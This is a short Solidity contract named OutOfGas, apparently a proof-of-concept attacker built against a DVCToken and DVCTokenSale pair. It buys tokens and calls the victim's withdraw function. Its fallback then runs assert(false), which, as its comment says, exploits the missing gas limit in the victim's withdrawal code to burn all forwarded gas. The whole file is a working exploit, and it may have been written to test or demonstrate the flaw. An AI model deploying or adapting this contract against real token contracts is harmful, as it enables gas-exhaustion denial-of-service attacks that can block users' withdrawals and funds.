pragma solidity ^0.4.22;

import "./DVCToken.sol";
import "./DVCTokenSale.sol";

contract OutOfGas {

    uint256 private tokens = 1;
    uint256 private value = tokens * 1000000000000000000;
    DVCToken public victim;
    DVCTokenSale public victimSale;

    constructor() payable {}

    function setVictimsAddresses(address _addressVictim, address _addressVictimSale) public {
        victim = DVCToken(_addressVictim);
        victimSale = DVCTokenSale(_addressVictimSale);
    }

    function buy() {
        victimSale.buyTokens.value(value)(tokens);
    }

    function runOutOfGas() {
        victim.withdraw(this, tokens, value);
    }

    /**
     * This assert(false) in the fallback function takes advantage of the no gas limit 
     * in the withdrawal of tokens [Line 93] within DVCToken. This burns all of the gas. 
     */
    function() public payable {
        assert(false);
    }
}